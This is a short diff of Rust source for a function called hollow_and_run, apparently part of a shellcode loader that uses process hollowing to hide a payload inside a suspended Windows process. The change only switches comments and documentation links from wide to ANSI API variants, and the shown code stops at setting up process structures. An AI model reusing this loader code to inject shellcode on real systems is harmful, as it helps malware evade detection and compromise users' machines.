@@ -32,8 +32,8 @@ fn array_to_u64_lit_end(array: &[u8; 8]) -> u64 {
 
 pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Create empty StartupInfoA struct for use in CreateProcess
-    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
-    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOA.html
     let startup_info: STARTUPINFOA = unsafe { mem::zeroed() };
 
     // Create empty ProcessInformation struct for use in CreateProcess
@@ -41,9 +41,9 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.PROCESS_INFORMATION.html
     let mut process_information: PROCESS_INFORMATION = unsafe { mem::zeroed() };
 
-    // Use CreateProcessW to create a suspended process that will be hollowed out for the shellcode
-    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
-    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
+    // Use CreateProcessA to create a suspended process that will be hollowed out for the shellcode
+    // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
+    // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessA.html
     let lp_application_name: PCSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
     lp_command_line.0 = CString::new(target_process).unwrap().into_raw() as *mut u8;
